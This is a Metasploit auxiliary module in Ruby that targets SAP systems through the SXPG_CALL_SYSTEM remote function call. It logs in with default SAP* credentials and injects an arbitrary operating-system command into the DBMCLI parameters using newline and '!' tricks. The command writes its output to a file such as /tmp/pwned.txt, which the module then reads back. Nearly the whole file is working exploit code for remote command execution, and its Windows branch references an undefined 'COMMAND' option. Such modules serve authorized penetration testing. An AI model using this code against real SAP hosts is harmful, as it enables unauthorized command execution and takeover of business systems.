##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# This module is based on, inspired by, or is a port of a plugin available in the Onapsis Bizploit Opensource ERP Penetration Testing framework - http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts in producing the Metasploit modules and was happy to share his knowledge and experience - a very cool guy.
# Id also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis who have Beta tested the modules and provided excellent feedback. Some people just seem to enjoy hacking SAP :)
##

require 'msf/core'
require 'msf/core/exploit/sap'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::SAP::RFC
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'SAP RFC SXPG_CALL_SYSTEM',
      'Description' => %q{
        This module makes use of the SXPG_CALL_SYSTEM Remote Function Call to execute OS commands as configured in SM69.
        The module requires the NW RFC SDK from SAP as well as the Ruby wrapper nwrfc (http://rubygems.org/gems/nwrfc).
      },
      'References' => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
      'Author' => [ 'nmonkee' ],
      'License' => BSD_LICENSE,
      'DefaultOptions' => {
        'CLIENT' => "000"
      }
    )

    register_options(
      [
        OptString.new('USERNAME', [true, 'Username', 'SAP*']),
        OptString.new('PASSWORD', [true, 'Password', '06071992']),
        OptString.new('CMD', [true, 'Command', 'id']),
        OptEnum.new('OS', [true, 'Windows NT/UNIX', "UNIX", ['UNIX','Windows NT']]),
      ], self.class)
  end

  def run_host(rhost)
    user = datastore['USERNAME']
    pass = datastore['PASSWORD']
    unless datastore['CLIENT'] =~ /^\d{3}\z/
        fail_with(Exploit::Failure::BadConfig, "CLIENT in wrong format")
    end

    os = "ANYOS"
    command = create_payload(1)
    res = exec_CMD(user,datastore['CLIENT'],pass,rhost,datastore['rport'],command,os)
    if res =~ /External program terminated with exit code/im
      print_error("#{rhost}:#{rport} [SAP] DBMCLI does not exist on target host")
      return
    end
    command = create_payload(2)
    res = exec_CMD(user,datastore['CLIENT'],pass,rhost,rport,command,os)
    print res if res
  end

  def create_payload(num)
    command = ""

    if datastore['OS'].downcase == "unix"
      if num == 1
        command = "-o /tmp/pwned.txt -n pwnie" + "\n!"
        command << datastore['CMD'].gsub(" ","\t")
        command << "\n"
      else
        command = "-ic /tmp/pwned.txt"
      end
    elsif datastore['OS'].downcase == "windows nt"
      if num == 1
        command = '-o c:\\pwn.out -n pwnsap' + "\r\n!"
        space = "%programfiles:~10,1%"
        command << datastore['COMMAND'].gsub(" ",space)
        # TODO The command should be gsubbed for space?
      else
        command = '-ic c:\\pwn.out'
      end
    end

    command
  end

  def exec_CMD(user,client,pass,rhost,rport,command,os)
    login(rhost, rport, client, user, pass) do |conn|
      conn.connection_info

      begin
        data  = sxpg_command_execute(conn,
                  {
                    :COMMANDNAME => 'DBMCLI',
                    :OPERATINGSYSTEM => os,
                    :ADDITIONAL_PARAMETERS => command
                  })

        #if data =~ /E[rR][rR]/ || data =~ /---/ || data =~ /for database \(/
          #nothing
        #elsif data =~ /unknown host/ || data =~ /\(see/ || data =~ /returned with/
          #nothing
        #else
        #  result << data
        #end

        return data
      rescue NWError => e
        print_error("#{rhost}:#{rport} [SAP] #{e.code} - #{e.message}")
      end
    end
  end
end

